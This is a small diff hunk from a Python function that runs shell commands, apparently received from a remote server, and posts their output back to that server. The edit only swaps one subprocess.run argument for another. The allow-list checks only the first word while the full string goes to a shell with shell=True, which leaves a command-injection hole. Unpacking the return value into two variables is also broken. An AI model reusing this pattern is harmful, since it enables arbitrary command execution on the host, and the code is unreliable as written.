@@ -45,7 +45,7 @@ def shell_command(com: str):
             }).json()
             return True
     if d[0] in {'ls', 'echo', 'cd', 'df', 'du'}:
-        sout, err = subprocess.run(com, shell=True, text=True)
+        sout, err = subprocess.run(com, shell=True, universal_newlines=True)
         requests.post(urljoin(url_base, "result"), json={
             "result": sout + err
         }).json()
